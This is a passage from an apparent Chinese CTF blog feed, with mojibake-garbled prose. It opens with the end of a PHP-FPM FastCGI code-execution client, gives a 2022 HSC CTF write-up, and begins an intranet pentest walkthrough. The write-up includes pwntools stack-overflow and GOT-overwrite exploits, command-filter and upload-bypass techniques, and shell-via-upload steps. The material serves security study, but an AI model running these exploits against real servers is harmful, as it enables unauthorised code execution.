FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file = php://input&#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    response = client.request(params, content)<br>    <span class="hljs-built_in">print</span>(force_text(response))<br></code></pre></td></tr></table></figure>



<hr>
<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>open_basedir</tag>
      </tags>
  </entry>
  <entry>
    <title>HSC1th 2022-wp</title>
    <url>/posts/e2c67dcf/</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h2><p><code>flag&#123;HSC_W3LC0M3&#125;</code></p>
<h2 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h2><blockquote>
<p>å“†å•¦Aæ¢¦æŠŠæ³¡å¥½çš„QRæ”¾è¿›å£è¢‹åï¼Œç”¨å…­ä½æ•°å­—æŠŠè‡ªå·±æ”¾å¥½äº†ã€‚ä½ èƒ½æ‰¾åˆ°å®ƒå—ï¼Ÿ</p>
</blockquote>
<p>å‹ç¼©åŒ…å…ˆæš´åŠ›ç ´è§£å‡ºå¯†ç ä¸º<code>376852</code></p>
<p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œå‘ç°é«˜åº¦ä¸å¯¹åŠ²ï¼Œå¢åŠ ä¸€ç‚¹é«˜åº¦ï¼Œçœ‹åˆ°ç ´æŸçš„äºŒç»´ç <br>æŠŠå®šä½ç¬¦è¡¥ä¸Šï¼Œæ‰«ç å¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022hsc-1.png"></p>
<h2 id="æ±é—»-äººè¨€å¦"><a href="#æ±é—»-äººè¨€å¦" class="headerlink" title="æ±é—»,äººè¨€å¦"></a>æ±é—»,äººè¨€å¦</h2><p>çœ‹åˆ°å‹ç¼©åŒ…çš„<code>50 4B 01 02</code>ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°å¤´ï¼Œæœäº†ä¸€ä¸‹å‘ç°å¤´è¢«æ”¹æˆäº†<code>4B 50</code><br><img src="/img/wp/2022/2022hsc-2.png"><br>ç»“å°¾ä¹Ÿæœ‰ä¸€å¤„<br><img src="/img/wp/2022/2022hsc-3.png"></p>
<p>æå–å‡ºæ¥åå‘ç°éœ€è¦å¯†ç <br>å‘ç°æ³¨é‡Š<code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code><br>è§‚å¯Ÿå‘ç°ä¸ºé”®ç›˜å¯†ç <br><img src="/img/wp/2022/2022hsc-4.png"><br>ä½†æ˜¯ç¬¬ä¸‰ä¸ªå­—ç¬¦æœ‰ç‚¹å¥‡æ€ªï¼Œä¸æ˜¯å­—æ¯ï¼Œæœ€åçŒœæµ‹æ˜¯æœ€åƒçš„A<br>å¯†ç ï¼š<code>WVALOU</code></p>
<p>è§£å‹å¾—åˆ°flagï¼Œæ–‡ä»¶å¤´ä¸º<code>52 49 46 46</code>ï¼ŒéŸ³é¢‘æ–‡ä»¶<br>audacityæŸ¥çœ‹ï¼Œé¢‘è°±å›¾ä¸­çœ‹åˆ°flag<br><img src="/img/wp/2022/2022hsc-5.png"></p>
<h2 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h2><p>é“¶æ²³å­—æ¯+å‡¹å‡¸å­—ä½“<br><img src="/img/wp/2022/2022hsc-6.jpg"><br><img src="/img/wp/2022/2022hsc-7.jpg"></p>
<p>ä¸è¡¨å¯¹ç…§ï¼Œä¸éš¾å‘ç°æ˜¯<code>50 4B</code>å³å‹ç¼©åŒ…<br>è§£å‹å¾—åˆ°<code>ZmxhZ3tnNUEwIWkyZjF9</code><br>base64è§£ç å¾—åˆ°flag</p>
<h2 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h2><p>ä¸‹è½½ä¸‹æ¥è§£å‹æç¤ºå‹ç¼©æ–‡ä»¶å·²æŸåï¼Œçœ‹åˆ°å¼€å¤´æ˜¯<code>PK</code>ï¼Œç»“å°¾æ˜¯<code>IEND</code>ï¼Œç›´æ¥foremostï¼Œå¾—åˆ°ä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡<br>åˆ†ç¦»å‡ºçš„å›¾ç‰‡å­˜åœ¨lsbéšå†™ï¼Œè—äº†ä¸€å¼ å›¾ç‰‡ï¼Œ<code>save bin</code>å¯¼å‡º<br><img src="/img/wp/2022/2022hsc-8.png"></p>
<p>å‘ç°æ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°<code>wrsak..iehr370</code><br>ä½†æ˜¯ç”¨æ¥è§£å‹å‹ç¼©åŒ…æç¤ºå¯†ç é”™è¯¯ï¼Œè§‚å¯Ÿåå‘ç°å‰é¢æ˜¯wiresharkå•è¯çš„é”™ä½ï¼Œæ …æ ä¸€ä¸‹å¾—åˆ°<code>wireshark3.7.0</code></p>
<p>è§£å‹åå¾—åˆ°ä¸€ä¸ª<code>wireshark</code>æ–‡ä»¶<br>ä»¥<code>%</code>å¼€å¤´ï¼Œä»¥<code>%%EOF</code>ç»“å°¾ï¼Œæ˜æ˜¾æ˜¯pdfæ–‡ä»¶ï¼Œä½†æ˜¯å¤´è¢«åˆ å»äº†ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥æ‰“ä¸å¼€<br><img src="/img/wp/2022/2022hsc-9.png"></p>
<p>è¡¥ä¸Š<code>PDF</code>ï¼Œä½¿ç”¨<code>wbStego4.3open</code>å·¥å…·ï¼Œç©ºå¯†ç æˆåŠŸè§£å‡ºflag</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h2><p>æç¤º<code>ä½ çŸ¥é“robotsåè®®å—ï¼Ÿ</code>ï¼Œè®¿é—®robots.txtï¼Œå¾—åˆ°<code>fiag_ls_h3re.php</code></p>
<p>ctrl+uï¼ŒF12ç­‰è¢«ç¦ç”¨ï¼Œä½¿ç”¨<code>view-source:</code>æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°flag</p>
<h2 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h2><p>æŠ“ä¸åˆ°åŒ…ï¼Œè¯´æ˜æ˜¯jsæ§åˆ¶çš„<br>é€ä¸ªæŸ¥çœ‹ï¼Œæœ€ååœ¨<code>main.js</code>ä¸­å‘ç°ä¸€ä¸²<code>ZmxhZ3thYzk5Y2M2ZC04NWFmLTRiNmItODNlZS0yYjNjYWMwOTg3Y2J9Cg==</code>ï¼Œè§£ç å¾—åˆ°flag</p>
<h2 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h2><p>é¢˜ç›®è¿‡æ»¤äº†ä¸€éƒ¨åˆ†å­—æ¯å’Œç¬¦å·ï¼Œä½†æ˜¯è¿˜å¯ä»¥ç»•è¿‡<br>ç©ºæ ¼ç”¨<code>$&#123;IFS&#125;</code>ä»£æ›¿ï¼Œ<code>ls</code>å’Œ<code>nl</code>è¿™äº›å­—æ¯ç”¨<code>\</code>è½¬ä¹‰,å› ä¸ºæ˜¯execï¼Œæ‰€ä»¥æœ€åè¾“å‡ºåˆ°æ–‡ä»¶</p>
<p>å…ˆæ‰¾flagæ–‡ä»¶åå’Œä½ç½®<br><img src="/img/wp/2022/2022hsc-10.png"></p>
<p>æŸ¥çœ‹flag<br><img src="/img/wp/2022/2022hsc-11.png"></p>
<h2 id="CMS-SYSTEM"><a href="#CMS-SYSTEM" class="headerlink" title="CMS SYSTEM"></a>CMS SYSTEM</h2><p>é¦–é¡µå¯ä»¥å¾—çŸ¥æ˜¯<code>YCCMS</code>,æ¼æ´åº“æŸ¥æ‰¾å†å²æ¼æ´ï¼Œå‘ç°å­˜åœ¨æœªæˆæƒæ›´æ”¹å¯†ç ï¼Œä»»æ„æ–‡ä»¶ä¸Šä¼ ç­‰ç­‰</p>
<p>æ›´æ”¹å¯†ç ï¼š<br><img src="/img/wp/2022/2022hsc-12.jpg"></p>
<p>æ–‡ä»¶ä¸Šä¼ ï¼š<br><img src="/img/wp/2022/2022hsc-13.jpg"></p>
<p>åˆ†æï¼š<br>LogoUpload.class.php:<br>å…ˆå°†å€¼ä»¥<code>.</code>æ‰“æ•£ä¸ºæ•°ç»„ï¼Œä¸”åªæ£€æŸ¥æ•°ç»„ä¸­ç¬¬äºŒä¸ªå€¼æ˜¯å¦ä¸ºpngï¼Œæ‰€ä»¥<code>1.png.php</code>å³å¯ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkType</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;name)[<span class="hljs-number">1</span>],<span class="hljs-variable">$this</span>-&gt;typeArr)) &#123;<br>			<span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;è­¦å‘Šï¼šLOGOå›¾ç‰‡å¿…é¡»æ˜¯PNGæ ¼å¼ï¼&#x27;</span>);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
<p>æœ€åæ–‡ä»¶ä¼šè¢«é‡å‘½åä¸º<code>logo.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setNewName</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-variable">$_nameArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;name);<br>		<span class="hljs-variable">$_postfix</span> = <span class="hljs-variable">$_nameArr</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$_nameArr</span>)-<span class="hljs-number">1</span>];<br>		<span class="hljs-comment">//$_newname = date(&#x27;YmdHis&#x27;).mt_rand(100,1000).&#x27;.&#x27;.$_postfix;</span><br>		<span class="hljs-variable">$_newname</span> = <span class="hljs-string">&#x27;logo.&#x27;</span>.<span class="hljs-variable">$_postfix</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;linkpath = UPLOGO.<span class="hljs-variable">$_newname</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-variable">$_newname</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>è®¿é—®php<br><img src="/img/wp/2022/2022hsc-14.jpg"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="hiahia-o-â–½-â”›"><a href="#hiahia-o-â–½-â”›" class="headerlink" title="hiahia o(*^â–½^*)â”›"></a>hiahia o(*^â–½^*)â”›</h2><p>å°†è¾“å…¥çš„å­—ç¬¦ä¸è¢«flagå‡½æ•°ä¿®æ”¹è¿‡çš„v4è¿›è¡Œæ¯”è¾ƒ<br><img src="/img/wp/2022/2022hsc-15.png"><br>ç„¶åæ ¹æ®flagå‡½æ•°ä¸v4å˜é‡çš„æ•°æ®å¾—å‡ºè„šæœ¬<br><img src="/img/wp/2022/2022hsc-16.png"></p>
<p>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span>  i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">9</span>:<br>            <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])+<span class="hljs-number">13</span>)<br>            <span class="hljs-keyword">else</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])+<span class="hljs-number">5</span>)<br>            <span class="hljs-keyword">else</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>


<h2 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h2><p>å®‰å“é€†å‘çš„è¯å…ˆå®‰è£…ä¸€ä¸‹<br>éšä¾¿è¾“å…¥ä¸€ä¸ªå€¼è®©å®ƒåˆ¤æ–­ä¸€ä¸‹<br><img src="/img/wp/2022/2022hsc-17.jpg"></p>
<p>éšä¾¿ä¸€ä¸ªé€†å‘è½¯ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²<code>FLAGé”™è¯¯</code><br>è¿™é‡Œç”¨jadxï¼Œå¾—åˆ°å…³é”®ä»£ç <br><img src="/img/wp/2022/2022hsc-18.jpg"></p>
<p>ä»£ç çš„å¤§æ¦‚æ„æ€æ˜¯ç´¢å¼•å€¼ä¸ºå•æ•°çš„å¼‚æˆ–ä¸‹ä¸€ä¸ªæˆå‘˜ï¼Œä¸ºåŒæ•°çš„å¼‚æˆ–ç´¢å¼•å€¼ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">17</span>; i++) &#123;<br>            iArr2[i] = i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="hljs-number">1</span>];<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>, <span class="hljs-number">13</span>, <span class="hljs-number">99</span>, <span class="hljs-number">28</span>, <span class="hljs-number">127</span>, <span class="hljs-number">55</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">121</span>, <span class="hljs-number">58</span>, <span class="hljs-number">83</span>, <span class="hljs-number">30</span>, <span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">42</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>            a[i]=a[i]^a[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>            a[i]=a[i]^i<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a]))<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2022/2022hsc-19.jpg"></p>
<h2 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h2><p>æœ‰å£³å…ˆè„±å£³<br><img src="/img/wp/2022/2022hsc-20.png"></p>
<p>ä¸€ä¸ªèµ°è¿·å®«çš„é¢˜ç›®<br><img src="/img/wp/2022/2022hsc-21.png"></p>
<p>æ‰¾åˆ°åœ°å›¾<br><img src="/img/wp/2022/2022hsc-22.png"><br><img src="/img/wp/2022/2022hsc-23.png"></p>
<p><code>OIIIIOOIO#IOOOIIOIOIIIIII</code></p>
<p>åˆšå¥½äº”ä¸ªåˆ†ä¸ºä¸€ç»„,ä»å·¦ä¸Šè§’èµ°åˆ°#<br>ç”¨é”®ç›˜è¡¨ç¤ºè·¯å¾„å°±æ˜¯<code>sdsddwd</code>ï¼Œmd5åå°±æ˜¯flagäº†</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h2><p>å› ä¸ºä½¿ç”¨äº†getså‡½æ•°ï¼Œæ²¡æœ‰å¯¹è¾“å…¥æ•°æ®è¿›è¡Œé™åˆ¶ï¼Œæ‰€ä»¥å¯¼è‡´äº†æ ˆæº¢å‡º<br><img src="/img/wp/2022/2022hsc-24.png"><br>æ¥ç€æ‰§è¡Œåé—¨å‡½æ•°è·å–flag<br><img src="/img/wp/2022/2022hsc-25.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;hsc2019.site&#x27;</span>,<span class="hljs-number">10679</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x400741</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022hsc-26.png"></p>
<h2 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h2><p>ç¨‹åºè®©æˆ‘ä»¬å†™å…¥åœ°å€å¹¶å‘åœ°å€å†™å…¥æ•°æ®<br><img src="/img/wp/2022/2022hsc-27.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¿®æ”¹gotè¡¨ ä½¿æŸä¸ªå‡½æ•°æ‰§è¡Œ åé—¨å‡½æ•°<br><img src="/img/wp/2022/2022hsc-28.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;pwn2&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;hsc2019.site&#x27;</span>,<span class="hljs-number">10257</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;ID?&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;address?&#x27;</span>,<span class="hljs-built_in">str</span>(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]).encode())<br>p.send(p64(<span class="hljs-number">0x400796</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022hsc-29.png"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h2><p>base16â€“&gt;base64â€“&gt;base32â€“&gt;base64</p>
<blockquote>
<p>flag{welc0me_to_my_s1gn_in}</p>
</blockquote>
<h2 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h2><p>å…ˆçˆ†ç ´aå’Œb<br><code>assert (&quot;flag&quot; in m)</code>è¡¨ç¤ºæ˜æ–‡ä¸­å­˜åœ¨flag<br>ç„¶åå› ä¸º<code>(a*b+c)%62= (a%62)*(b%62)+c%62</code>ï¼Œæ‰€ä»¥aå’Œbå°äº62</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>letter=string.ascii_letters+string.digits<br>e=<span class="hljs-string">&quot;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;</span><br>a1,b1=<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e)-<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>):<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>):<br>            <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;f&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i])):<br>                <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;l&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i+<span class="hljs-number">1</span>])):<br>                    <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;a&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i+<span class="hljs-number">2</span>])):<br>                        <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;g&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i+<span class="hljs-number">3</span>])):<br>                            a1,b1=a,b<br><br>flag=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>):<br>        <span class="hljs-keyword">if</span> (j*a1+b1)%<span class="hljs-number">62</span>==letter.index(i):<br>            flag.append(j)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(hashlib.md5(<span class="hljs-string">&#x27;&#x27;</span>.join(letter[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag)).hexdigest())<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>HSC</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnthebox-å†…ç½‘æ¸—é€(å…¥é—¨)</title>
    <url>/posts/4ee67181/</url>
    <content><![CDATA[<h1 id="ä½¿ç”¨åˆ°çš„å·¥å…·"><a href="#ä½¿ç”¨åˆ°çš„å·¥å…·" class="headerlink" title="ä½¿ç”¨åˆ°çš„å·¥å…·"></a>ä½¿ç”¨åˆ°çš„å·¥å…·</h1><p>kali<br>burp<br>firefox<br>reGeorg<br>proxychains<br>nmap<br>å†°è<br>èšå‰‘</p>
<h1 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h1><p>æ ¹æ®æè¿°å¾—çŸ¥æœ‰ä¸¤å±‚ï¼Œå› ä¸ºæ˜¯demoé¢˜ç›®ï¼Œæ‰€ä»¥ç»™å‡ºäº†æ¼æ´ï¼Œé™ä½äº†éš¾åº¦ï¼Œå®é™…ä¸Šçš„é¢˜ç›®æ¼æ´ç‚¹æ˜¯ä¸çŸ¥é“çš„ï¼Œéœ€è¦è‡ªå·±å‘æ˜</p>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-1.png"></p>
<h1 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h1><h2 id="ç¬¬ä¸€å±‚"><a href="#ç¬¬ä¸€å±‚" class="headerlink" title="ç¬¬ä¸€å±‚"></a>ç¬¬ä¸€å±‚</h2><p>apacheè§£ææ¼æ´<br>ä¸Šä¼ <code>1.php.jpg</code>å³å¯<code>getshell</code></p>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-2.png"></p>
